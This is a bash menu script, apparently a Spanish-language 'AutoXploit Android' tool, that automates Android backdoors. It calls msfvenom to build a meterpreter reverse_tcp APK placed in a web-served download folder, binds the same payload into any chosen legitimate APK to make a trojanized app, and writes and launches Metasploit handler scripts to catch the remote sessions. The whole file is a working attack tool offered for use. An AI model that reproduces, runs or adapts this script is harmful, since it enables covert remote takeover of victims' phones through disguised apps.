
New_backdoor() {

	# PARAMETROS DEL BACKDOOR (.APK)

	echo " 		Input the LHOST : "
	read lhost
	echo " 		Input the LPORT :"
	read lport
	echo " 		Input the name of the backdoor "
	echo " 			*remember it must end on .apk*"
	read Backdoor_name
	echo " 		Creating backdoor...."
	
	# CREA EL BACKDOOR

	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /var/www/html/Descargas/$Backdoor_name 
	echo "_________________________________________________________"
	echo ""
	echo " B A C K D O O R   S U C C E S F U L L Y   C R E A T E D "
	echo "_________________________________________________________"
	
	service postgresql start

	# PARAMETROS LISTENER 	

	echo " Continue ? (Y/N)"
	echo " 		Introduce el lhost del listener" 
	read localhost
	echo " 		Introduce el lport del listener"
	read localport

	# EXPLOIT, PAYLOAD, IP Y PUERTO || METASPLOIT ||

	echo "use exploit/multi/handler" >> .listener.rc
	echo "set payload android/meterpreter/reverse_tcp" >> .listener.rc
	echo "set lhost $localhost" >> .listener.rc
	echo "set lport $localport " >> .listener.rc
	echo "exploit" >> .listener.rc
	echo "_________________________________________________________"
	echo ""
	echo "		S T A R T I N G   M E T A S P L O I T 		"
	echo "_________________________________________________________"
	msfconsole -r .listener.rc

	# WORK CLEAN

	rm .listener.rc
}



Listener() {

	# PARAMETROS LISTENER	

		echo "		Introduce el lhost del listener" 
        read localhost
        echo " 		Introduce el lport del listener"
        read localport

	# EXPLOIT, PAYLOAD, IP Y PUERTO | METASPLOIT |

        echo "use exploit/multi/handler" >> .listener.rc
        echo "set payload android/meterpreter/reverse_tcp" >> .listener.rc
        echo "set lhost $localhost" >> .listener.rc
        echo "set lport $localport " >> .listener.rc
        echo "exploit" >> .listener.rc
       	echo "______________________________________________________________"
	echo ""
	echo "		 I N I C I A N D O   M E T A S P L O I T "
	echo "______________________________________________________________ "
	msfconsole -r .listener.rc
	# CLEANING 

		rm .listener.rc
}

Sessions() {
	
	echo "		Introduce el lhost"
	read localhost
	echo "		Introduce el lport"
	read localport
	echo "______________________________________________________________"
	echo ""
	echo "			I N I C I A N D O   M E T A S P L O I T "
	echo "______________________________________________________________ "
	echo "use exploit/multi/handler" >> .sessions.rc
	echo "set payload android/meterpreter/reverse_tcp" >> .sessions.rc
	echo "set lhost $localhost" >> .sessions.rc
	echo "sessions -i" >> .sessions.rc

	msfconsole -r .sessions.rc
	rm .handler.rc
}

BackdoorEverywhere() {

	echo "		Introduce el nombre del .apk a infectar"
	read APKname
	echo "		Introduce el lhost"
	read lhost
	echo "		Introduce el lport"
	read lport
	echo "		Introduce el nombre del .apk resultante"
	read CH3ATEDapk
	msfvenom -x $APKname -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $CH3ATEDapk
	echo "_________________________________________________________"
	echo ""
	echo "	A P K   S U C C E S F U L L Y   C H 3 A T E D	"
	echo "_________________________________________________________"

}

otheropt() {

	clear
	echo "		 _______          _________ _______             _______  _        _______ __________________"
	echo "		|  ___  ||\     /|\__   __/|  ___  |  |\     /||  ____ || \      |  ___  |\__   __/\__   __/"
	echo "		| |   | || |   / |   / \   | |   | |  \ \   / /| |    ||| |      | |   | |   / \      / \   "
	echo "		| |___| || |   | |   | |   | |   | |   \ \_/ / | |____||| |      | |   | |   | |      | |   "
	echo "		|  ___  || |   | |   | |   | |   | |    X3V0X  |  _____|| |      | |   | |   | |      | |   "
	echo "		| |   | || |   | |   | |   | |   | |   / / \ \ | |      | |      | |   | |   | |      | |   "
	echo "		| /   \ || (___) |   | |   | (___) |  ( /   \ )| |      | |____/\| |___| |___\ /___   | |   "
	echo "		|/     \||_______|   \_/   (_______)  |/     \||/       |_______/\_______/\_______/   |_|   "
	echo "                                                                                            "
	echo "			   /\              ______   _______  _______ _________ ______                               "
	echo "			  / /  _ |\    / |/  __  \ /  ____ \/  ___  \\__   __/(  __  \                              "
	echo "			 / /  | ||  \  | || (  \  \| |    \|| |  /| |   / \   | (  \  \                             "
	echo "			/ /___| ||   \ | || |   \  | |____/|| | / | |   | |   | |   \  \                            "
	echo "			\_____  || |\ \| || |    | |      _|| |/ /| |   | |   | |    | |                             "
	echo "			      | || | \   || |   /  | |\ \   | | / | |   | |   | |   /  /                             "
	echo "			      \ || /  \  || |__/  /| | \ \__| |/__| |___\ /___| |__/  /                             "
	echo "			       \||/    \_|\______/ |/   \__/(_______)\_______/\______/                              "
	echo ""

	echo ""
	echo "		          ||       Tested on 8/9.x.x      ||      3V0     ||       www.hackers.eus                 ||"
	echo " "
	echo "        	______________________________________________________________________________________________"
	echo "         	###                                     OPTIONS                	                	   ###"
	echo "		##			______________________________________________________		    ##"		
	echo "		##				1) Bind payload in any apk 				    ##"
	echo "		##			______________________________________________________		    ##"
	echo "		##				2) Exit 						    ##"
	echo "		##			______________________________________________________		    ##"	


	read ch
	case $ch in 
		1)BackdoorEverywhere ;;
		2)intro ;;
		*) echo " That was not any of the options... "
	esac

}
intro() {
	clear
	echo "		 _______          _________ _______             _______  _        _______ __________________"
	echo "		(  ___  )|\     /|\__   __/(  ___  )  |\     /|(  ____ )( \      (  ___  )\__   __/\__   __/"
	echo "		| (   ) || )   ( |   ) (   | (   ) |  ( \   / )| (    )|| (      | (   ) |   ) (      ) (   "
	echo "		| (___) || |   | |   | |   | |   | |   \ (_) / | (____)|| |      | |   | |   | |      | |   "
	echo "		|  ___  || |   | |   | |   | |   | |    ) _ (  |  _____)| |      | |   | |   | |      | |   "
	echo "		| (   ) || |   | |   | |   | |   | |   / ( ) \ | (      | |      | |   | |   | |      | |   "
	echo "		| )   ( || (___) |   | |   | (___) |  ( /   \ )| )      | (____/\| (___) |___) (___   | |   "
	echo "		|/     \|(_______)   )_(   (_______)  |/     \||/       (_______/(_______)\_______/   )_(   "
	echo "                                                                                            "
	echo "			 _______  _        ______   _______  _______ _________ ______                               "
	echo "			(  ___  )( (    /|(  __  \ (  ____ )(  ___  )\__   __/(  __  \                              "
	echo "			| (   ) ||  \  ( || (  \  )| (    )|| (   ) |   ) (   | (  \  )                             "
	echo "			| (___) ||   \ | || |   ) || (____)|| |   | |   | |   | |   ) |                             "
	echo "			|  ___  || (\ \) || |   | ||     __)| |   | |   | |   | |   | |                             "
	echo "			| (   ) || | \   || |   ) || (\ (   | |   | |   | |   | |   ) |                             "
	echo "			| )   ( || )  \  || (__/  )| ) \ \__| (___) |___) (___| (__/  )                             "
	echo "			|/     \||/    )_)(______/ |/   \__/(_______)\_______/(______/                              "
	echo ""
	echo "		||	 Tested on 8/9.x.x	||	3V0	||  	 www.hackers.eus		 ||"
	echo " "
	echo "		___________________________________________________________________________________________"
	echo "		### 					OPTIONS	     					###"
	echo "		##               _________________________________________________ 			##"
	echo "		##		 	1) Create new backdoor and start listener 			##"
	echo " 		##               _________________________________________________ 			##"
	echo "		##			2) Start listener 						##"
	echo "		##               _________________________________________________ 			##"
	echo "		##			3) Show sessions 						##"
	echo "		##		 _________________________________________________			##"
	echo "		##			4) More options							##"
	echo "		##               _________________________________________________ 			##"
	echo "		##			5) EXIT								##"
	echo "		##               _________________________________________________ 			##"
	read ch

	case $ch in 
		1)New_backdoor ;;
		2)Listener ;;
		3)Sessions ;;
		4)otheropt ;;
		5)exit 0;;
		*) echo " That was not any of the options... "
	esac

}


	intro

